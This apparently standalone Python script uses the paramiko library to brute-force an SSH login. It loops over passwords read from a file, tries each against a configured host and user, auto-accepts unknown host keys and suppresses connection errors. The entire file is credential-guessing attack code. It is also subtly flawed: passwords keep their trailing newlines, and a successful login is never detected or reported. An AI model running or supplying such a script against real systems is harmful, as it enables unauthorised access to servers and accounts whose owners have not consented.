from paramiko import SSHClient, AutoAddPolicy, SSHException

from config import HOST, USER


with open("./passwords.txt", "r") as f:
    passwords = f.readlines() 
    
client = SSHClient()
client.set_missing_host_key_policy(AutoAddPolicy())

for password in passwords:
    try:
        client.connect(hostname=HOST, username=USER, password=password, port=22)
    except SSHException:
        pass